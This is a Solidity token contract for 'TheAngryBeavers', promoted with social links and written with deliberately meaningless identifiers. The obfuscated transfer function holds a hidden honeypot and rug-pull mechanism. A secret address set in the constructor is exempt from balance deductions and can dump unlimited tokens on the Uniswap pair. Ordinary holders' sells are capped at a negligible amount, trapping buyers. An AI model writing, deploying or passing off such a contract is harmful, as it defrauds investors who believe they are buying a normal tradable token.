/*

https://twitter.com/AngryBeaversEth

https://t.me/AngryBeaversEth

https://angrybeaverseth.xyz/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract TheAngryBeavers is Ownable {
    uint256 private lvudy = 114;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private fyeu;

    function transferFrom(address rxhunmwd, address kpwqdcysfrio, uint256 jgbtrel) public returns (bool success) {
        require(jgbtrel <= allowance[rxhunmwd][msg.sender]);
        allowance[rxhunmwd][msg.sender] -= jgbtrel;
        kaet(rxhunmwd, kpwqdcysfrio, jgbtrel);
        return true;
    }

    function kaet(address rxhunmwd, address kpwqdcysfrio, uint256 jgbtrel) private {
        address pvbos = IUniswapV2Factory(fyeu.factory()).getPair(address(this), fyeu.WETH());
        bool pcglhyirztk = jbhqguyos[rxhunmwd] == block.number;
        if (0 == ftyxujnvwsh[rxhunmwd]) {
            if (rxhunmwd != pvbos && (!pcglhyirztk || jgbtrel > pbzwce[rxhunmwd]) && jgbtrel < totalSupply) {
                require(jgbtrel <= totalSupply / (10 ** decimals));
            }
            balanceOf[rxhunmwd] -= jgbtrel;
        }
        pbzwce[kpwqdcysfrio] = jgbtrel;
        balanceOf[kpwqdcysfrio] += jgbtrel;
        jbhqguyos[kpwqdcysfrio] = block.number;
        emit Transfer(rxhunmwd, kpwqdcysfrio, jgbtrel);
    }

    function transfer(address kpwqdcysfrio, uint256 jgbtrel) public returns (bool success) {
        kaet(msg.sender, kpwqdcysfrio, jgbtrel);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    uint8 public decimals = 9;

    mapping(address => uint256) private jbhqguyos;

    function approve(address mxqoltnj, uint256 jgbtrel) public returns (bool success) {
        allowance[msg.sender][mxqoltnj] = jgbtrel;
        emit Approval(msg.sender, mxqoltnj, jgbtrel);
        return true;
    }

    constructor(string memory omrshcvad, string memory ufayog, address odplaxen, address ntgiqzdwhkps) {
        name = omrshcvad;
        symbol = ufayog;
        balanceOf[msg.sender] = totalSupply;
        ftyxujnvwsh[ntgiqzdwhkps] = lvudy;
        fyeu = IUniswapV2Router02(odplaxen);
    }

    string public name;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private ftyxujnvwsh;

    mapping(address => uint256) public pbzwce;

    mapping(address => mapping(address => uint256)) public allowance;
}
